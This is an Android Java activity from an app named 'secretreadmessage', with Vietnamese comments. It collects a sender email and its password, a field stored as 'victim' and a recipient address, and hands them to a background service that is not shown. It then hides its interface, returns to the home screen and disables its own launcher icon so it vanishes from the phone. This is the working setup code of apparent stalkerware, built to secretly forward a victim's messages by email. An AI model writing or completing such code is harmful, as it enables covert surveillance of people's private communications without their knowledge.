package com.example.phamngochieu.secretreadmessage;

import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    private SharedPreferences pref;
    private SharedPreferences.Editor editor;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    public void onClick(View view)
    {
        TextView mail_sender = (TextView)findViewById(R.id.editText);
        TextView pass_mail_sender = (TextView)findViewById(R.id.editText2);
        TextView title = (TextView)findViewById(R.id.editText3);
        TextView mail_nhan = (TextView)findViewById(R.id.editText4);
        // lưu những thông tin mà người dùng nhập vào tới file ngoài
        saveInfomationToFile(mail_sender.getText().toString(), pass_mail_sender.getText().toString(), title.getText().toString(), mail_nhan.getText().toString());
        // đưa thông tin vào Intent
        Intent intent = new Intent(this,DelayedMessageService.class);
        intent.putExtra(DelayedMessageService.MAIL_SENDER,mail_sender.getText().toString());
        intent.putExtra(DelayedMessageService.PASS_MAIL_SENDER, pass_mail_sender.getText().toString());
        intent.putExtra(DelayedMessageService.TITLE,title.getText().toString());
        intent.putExtra(DelayedMessageService.MAIL_NHAN, mail_nhan.getText().toString());
        startService(intent);
        //ẩn hết các thành phần trên giao diện Activity
        mail_sender.setVisibility(View.GONE);
        pass_mail_sender.setVisibility(View.GONE);
        title.setVisibility(View.GONE);
        mail_nhan.setVisibility(View.GONE);
        Button button = (Button)findViewById(R.id.button);
        button.setVisibility(View.GONE);
        // về màn hình chính
        Intent startMain = new Intent(Intent.ACTION_MAIN);
        startMain.addCategory(Intent.CATEGORY_HOME);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(startMain);
        // ẩn Icon của App
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }
    /**
     * phương thức ghi dữ liệu thông tin vào file ngoài
     */
    public void saveInfomationToFile(String sender,String pass,String victim,String mailto)
    {
        Log.e("*******", "đang ghi dữ liệu lên file ngoài");
        pref = getApplicationContext().getSharedPreferences("phamngochieu.it", 0);// 0 - là chế độ private
        editor = pref.edit();
        editor.putString("mailsender", sender);
        editor.putString("pass", pass);
        editor.putString("victim", victim);
        editor.putString("mailto", mailto);
        editor.commit();
    }
}
